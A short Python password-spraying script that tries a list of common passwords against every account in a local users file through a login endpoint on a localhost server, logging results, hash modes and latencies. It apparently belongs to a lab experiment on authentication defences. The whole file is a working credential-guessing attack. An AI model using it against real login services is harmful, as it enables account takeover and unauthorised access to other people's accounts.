# password spraying attack
import requests
import time
import json
import os
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
BASE_URL = "http://127.0.0.1:5000"
USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")

COMMON_PASSWORDS = [
    "123456", "mypassword", "111111", "qwerty", "abc123", "admin",
    "000000", "123321", "ilovedogs", "ilovecats", "532645069"
]

def load_users():
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def password_spray():
    users = load_users()
    for pwd in COMMON_PASSWORDS:
        print(f"\n[INFO] Trying common password: {pwd}")
        for user in users:
            username = user["username"]
            hash_mode = user.get("hash_mode", "sha256")
            start = time.time()
            resp = requests.post(f"{BASE_URL}/login", json={
                "username": username,
                "password": pwd
            })
            latency_ms = int((time.time() - start) * 1000)

            if resp.status_code == 200:
                result = "SUCCESS"
                print(f"[SUCCESS] {username} authenticated with password '{pwd}' (latency {latency_ms} ms)")
            else:
                result = "FAILED"
                print(f"[FAILED] {username} with '{pwd}' (latency {latency_ms} ms)")

            entry = {
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "hash_mode": hash_mode,
                "result": result,
                "latency_ms": latency_ms
            }
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")

if __name__ == "__main__":
    password_spray()